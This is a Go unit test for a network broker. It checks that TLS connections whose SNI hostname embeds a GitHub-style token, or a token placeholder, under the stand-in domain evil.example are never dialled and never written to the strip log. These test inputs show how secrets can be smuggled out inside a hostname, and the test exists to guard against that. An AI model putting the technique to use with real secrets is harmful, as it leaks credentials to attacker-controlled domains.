package broker

import (
	"net/netip"
	"strings"
	"testing"

	"pi-fortress/internal/preamble"
)

// The SNI check also applies when the destination is a real address: in
// forward mode, and with fake-IP on for an address outside the pool. The
// broker dials with the SNI. Thus an SNI that holds a key or a placeholder
// gets no dial and no answer from the origin, and the key stays out of the
// strip log.
func TestKeyShapedSNIToARealAddressNotDialled(t *testing.T) {
	key := "ghp_" + strings.Repeat("A1b2", 9)
	real := netip.MustParseAddrPort("8.8.8.8:443")
	req := "GET / HTTP/1.1\r\nHost: evil.example\r\n\r\n"
	for _, fakeOn := range []bool{false, true} {
		for _, sni := range []string{
			key + ".evil.example",
			key[:20] + "." + key[20:] + ".evil.example",
			"pf_0123456789abcdef_GITHUB_TOKEN.evil.example",
		} {
			name := sni[:12]
			if fakeOn {
				name = "fakeip-on/" + name
			}
			t.Run(name, func(t *testing.T) {
				r := newFakeRig(t, "1.1.1.1")
				if !fakeOn {
					r.b.FakeIP = nil
				}
				p := preamble.Preamble{SNI: sni, OrigDst: real}
				resp, body := roundtripStream(t, r.b, p, req)
				if resp.Code == 200 || string(body) == upstreamOK {
					t.Fatalf("key-shaped SNI reached the origin: code=%d body=%q", resp.Code, body)
				}
				if d := r.dials(); len(d) != 0 {
					t.Fatalf("dialed %v with a key-shaped SNI", d)
				}
				rows := stripRows(t, r.strip)
				if strings.Contains(rows, key[:20]) || strings.Contains(rows, "0123456789abcdef") {
					t.Fatalf("key in the strip log: %s", rows)
				}
			})
		}
	}
}
